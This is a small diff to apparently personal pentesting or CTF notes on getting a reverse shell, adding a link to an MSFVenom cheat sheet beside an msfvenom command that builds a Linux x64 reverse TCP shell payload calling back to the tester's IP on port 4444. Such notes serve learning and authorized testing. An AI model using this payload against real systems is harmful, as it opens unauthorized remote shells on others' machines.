@@ -14,6 +14,8 @@ This is a very useful thing to have. This can also be upgraded to a semi-interac
 - Usually `4444` is good and free, but if it isn't, anything free above `1024` will do
 
 ### Get an OS shell for your target machine
+- Cheat sheat to OS shell generation can be found at
+    - [Infinite Logins MSFVenom Cheat Sheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
 - In this case it'll be Linux x64, so just create it with msfvenom
     - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP adress> LPORT=<4444 or port that you prefer> -f elf > shell.elf`
 - Be sure to fill in **YOUR** IP adress and the port you chose before generating it
